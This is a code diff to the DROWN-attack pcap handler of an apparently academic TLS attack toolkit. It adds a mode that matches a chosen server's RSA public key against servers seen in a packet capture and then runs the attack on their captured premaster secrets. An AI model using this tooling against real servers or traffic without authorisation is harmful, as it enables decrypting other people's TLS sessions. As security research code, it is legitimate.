@@ -10,6 +10,7 @@
 package de.rub.nds.tlsbreaker.drownattack.impl.drown;
 
 import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
+import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
 import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
 import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ConsoleInteractor;
 import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
@@ -18,9 +19,11 @@ import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ServerSelection;
 import de.rub.nds.tlsbreaker.drownattack.config.BaseDrownCommandConfig;
 import de.rub.nds.tlsbreaker.drownattack.config.GeneralDrownCommandConfig;
 import de.rub.nds.tlsbreaker.drownattack.config.SpecialDrownCommandConfig;
+import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import java.security.interfaces.RSAPublicKey;
 import java.util.*;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
@@ -30,9 +33,11 @@ public class DrownPcapFileHandler {
 
     private static final Logger LOGGER = LogManager.getLogger();
     BaseDrownCommandConfig baseDrownCommandConfig;
+    ConsoleInteractor consoleInteractor;
 
     public DrownPcapFileHandler(BaseDrownCommandConfig baseDrownCommandConfig) {
         this.baseDrownCommandConfig = baseDrownCommandConfig;
+        this.consoleInteractor = new ConsoleInteractor();
     }
 
     public void handlePcapFile() {
@@ -44,45 +49,124 @@ public class DrownPcapFileHandler {
             Map<String, List<PcapSession>> serverSessionsMap = serverSelection.getServerSessionsMap();
             List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
             if (!uniqueServers.isEmpty()) {
-                CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
-                ConsoleInteractor consoleInteractor = new ConsoleInteractor();
-                consoleInteractor.displayServerAndPmsCount(uniqueServers, serverSessionsMap);
-                String userOption = consoleInteractor.getValidUserSelection(uniqueServers);
-                if ("N".equals(userOption)) {
-                    CONSOLE.info("Execution of the attack cancelled.");
-                } else if ("a".equals(userOption)) {
-                    checkVulnerabilityOfAllServersAndDisplay(uniqueServers, baseDrownCommandConfig, serverSessionsMap,
-                        consoleInteractor);
-                } else if (isCommaSeparatedList(userOption)) {
-                    List<String> hosts = new ArrayList<>();
-                    Arrays.stream(userOption.split(",")).forEach(
-                        serverNumber -> hosts.add(uniqueServers.get(Integer.parseInt(trim(serverNumber)) - 1)));
-
-                    checkVulnerabilityOfAllServersAndDisplay(hosts, baseDrownCommandConfig, serverSessionsMap,
-                        consoleInteractor);
+                if (isConnectParameterGiven()) {
+                    processServerOverride(uniqueServers, serverSessionsMap);
                 } else {
-                    String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
-                    LOGGER.info("Selected server: " + host);
-                    baseDrownCommandConfig.getClientDelegate().setHost(host);
-                    Boolean vulnerability = checkVulnerability(baseDrownCommandConfig);
-                    if (Objects.equals(vulnerability, Boolean.TRUE)) {
-                        CONSOLE.info("Server " + host + " is vulnerable.");
-                        CONSOLE.info("Do you want to execute the attack? (y/n):");
-                        String userResponse = consoleInteractor.getUserYesNoResponse();
-                        if ("Y".equals(userResponse)) {
-                            executeAttack(host, serverSessionsMap, baseDrownCommandConfig);
-                        } else if ("N".equals(userResponse)) {
-                            CONSOLE.info("Execution of the attack cancelled.");
-                        }
-                    } else {
-                        CONSOLE.info("The server " + host + " is not vulnerable.");
-                    }
+                    processPcapServers(uniqueServers, serverSessionsMap);
                 }
+
             } else {
                 CONSOLE.info("\nFound no potential servers for DROWN attack.");
             }
         } else {
             CONSOLE.info("No TLS handshake message found.");
+        }
+    }
+
+    private void processServerOverride(List<String> uniqueServers, Map<String, List<PcapSession>> serverSessionsMap) {
+        String overridingHost = baseDrownCommandConfig.getClientDelegate().getHost();
+        Attacker<? extends TLSDelegateConfig> attacker = getAttacker(baseDrownCommandConfig);
+        Boolean result = attacker.checkVulnerability();
+        if (Objects.equals(result, Boolean.TRUE)) {
+            CONSOLE.info("Vulnerable:" + result.toString());
+            CONSOLE.info("Server " + overridingHost + " is vulnerable");
+            List<PcapSession> vulnerablePcapSessions =
+                getVulnerableSessions(uniqueServers, serverSessionsMap, attacker);
+            if (!vulnerablePcapSessions.isEmpty()) {
+                consoleInteractor.displayServerAndSessionDetails(vulnerablePcapSessions);
+                CONSOLE.info("Do you want to execute the attack? (y/n):");
+                String userResponse = consoleInteractor.getUserYesNoResponse();
+                if ("Y".equals(userResponse)) {
+                    // String host = vulnerableServers.get(0);
+                    executeAttack(overridingHost, vulnerablePcapSessions, baseDrownCommandConfig);
+                } else if ("N".equals(userResponse)) {
+                    CONSOLE.info("Execution of the attack cancelled.");
+                }
+            } else {
+                CONSOLE.info("Encrypted PMS cannot be fetched. No server from the pcap file has the same public as "
+                    + overridingHost);
+            }
+
+        } else if (Objects.equals(result, Boolean.FALSE)) {
+            CONSOLE.info("Vulnerable:" + result.toString());
+        } else {
+            CONSOLE.warn("Vulnerable: Uncertain");
+        }
+    }
+
+    private List<PcapSession> getVulnerableSessions(List<String> uniqueServers,
+        Map<String, List<PcapSession>> serverSessionsMap, Attacker<? extends TLSDelegateConfig> attacker) {
+        List<PcapSession> pcapSessions = new ArrayList<>();
+        RSAPublicKey publicKey = getPublicKey(attacker);
+        List<String> servers = getServersWithSamePublicKey(publicKey, uniqueServers, attacker);
+        for (String server : servers) {
+            pcapSessions.addAll(serverSessionsMap.get(server));
+        }
+        return pcapSessions;
+    }
+
+    private RSAPublicKey getPublicKey(Attacker<? extends TLSDelegateConfig> attacker) {
+        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(attacker.getTlsConfig());
+        if (publicKey == null) {
+            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
+            return null;
+        }
+        LOGGER.info("Fetched the following server public key: " + publicKey);
+        return publicKey;
+    }
+
+    private List<String> getServersWithSamePublicKey(RSAPublicKey publicKey, List<String> uniqueServers,
+        Attacker<? extends TLSDelegateConfig> attacker) {
+        List<String> servers = new ArrayList<>();
+        for (String server : uniqueServers) {
+            baseDrownCommandConfig.getClientDelegate().setHost(server);
+            RSAPublicKey publicKeyOfPcapServer =
+                (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(attacker.getTlsConfig());
+            if (publicKey.equals(publicKeyOfPcapServer)) {
+                servers.add(server);
+            }
+        }
+        return servers;
+    }
+
+    private boolean isConnectParameterGiven() {
+        return !StringUtils.isEmpty(baseDrownCommandConfig.getClientDelegate().getHost());
+    }
+
+    private void processPcapServers(List<String> uniqueServers, Map<String, List<PcapSession>> serverSessionsMap) {
+        CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
+        ConsoleInteractor consoleInteractor = new ConsoleInteractor();
+        consoleInteractor.displayServerAndPmsCount(uniqueServers, serverSessionsMap);
+        String userOption = consoleInteractor.getValidUserSelection(uniqueServers);
+        if ("N".equals(userOption)) {
+            CONSOLE.info("Execution of the attack cancelled.");
+        } else if ("a".equals(userOption)) {
+            checkVulnerabilityOfAllServersAndDisplay(uniqueServers, baseDrownCommandConfig, serverSessionsMap,
+                consoleInteractor);
+        } else if (isCommaSeparatedList(userOption)) {
+            List<String> hosts = new ArrayList<>();
+            Arrays.stream(userOption.split(","))
+                .forEach(serverNumber -> hosts.add(uniqueServers.get(Integer.parseInt(trim(serverNumber)) - 1)));
+
+            checkVulnerabilityOfAllServersAndDisplay(hosts, baseDrownCommandConfig, serverSessionsMap,
+                consoleInteractor);
+        } else {
+            String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
+            LOGGER.info("Selected server: " + host);
+            baseDrownCommandConfig.getClientDelegate().setHost(host);
+            Boolean vulnerability = checkVulnerability(baseDrownCommandConfig);
+            if (Objects.equals(vulnerability, Boolean.TRUE)) {
+                CONSOLE.info("Server " + host + " is vulnerable.");
+                CONSOLE.info("Do you want to execute the attack? (y/n):");
+                String userResponse = consoleInteractor.getUserYesNoResponse();
+                if ("Y".equals(userResponse)) {
+                    executeAttack(host, serverSessionsMap.get(host), baseDrownCommandConfig);
+                } else if ("N".equals(userResponse)) {
+                    CONSOLE.info("Execution of the attack cancelled.");
+                }
+            } else {
+                CONSOLE.info("The server " + host + " is not vulnerable.");
+            }
         }
     }
 
@@ -99,7 +183,7 @@ public class DrownPcapFileHandler {
             String userResponse = consoleInteractor.getUserYesNoResponse();
             if ("Y".equals(userResponse)) {
                 String host = vulnerableServers.get(0);
-                executeAttack(host, serverSessionsMap, baseDrownCommandConfig);
+                executeAttack(host, serverSessionsMap.get(host), baseDrownCommandConfig);
             } else if ("N".equals(userResponse)) {
                 CONSOLE.info("Execution of the attack cancelled.");
             }
@@ -108,7 +192,7 @@ public class DrownPcapFileHandler {
             CONSOLE.info("server number: ");
             int serverNumber = consoleInteractor.getUserSelectedServer(uniqueServers);
             String host = uniqueServers.get(serverNumber - 1);
-            executeAttack(host, serverSessionsMap, baseDrownCommandConfig);
+            executeAttack(host, serverSessionsMap.get(host), baseDrownCommandConfig);
         }
     }
 
@@ -133,11 +217,11 @@ public class DrownPcapFileHandler {
         return vulnerableServers;
     }
 
-    private void executeAttack(String host, Map<String, List<PcapSession>> serverSessionsMap,
+    private void executeAttack(String host, List<PcapSession> hostSessions,
         BaseDrownCommandConfig baseDrownCommandConfig) {
 
         baseDrownCommandConfig.getClientDelegate().setHost(host);
-        baseDrownCommandConfig.setPremasterSecretsFromPcap(getPreMasterSecrets(serverSessionsMap.get(host)));
+        baseDrownCommandConfig.setPremasterSecretsFromPcap(getPreMasterSecrets(hostSessions));
         LOGGER.info(
             "host=" + baseDrownCommandConfig.getClientDelegate().getHost() + " and count of encrypted Premaster Secret="
                 + baseDrownCommandConfig.getPremasterSecretsFromPcap().size());
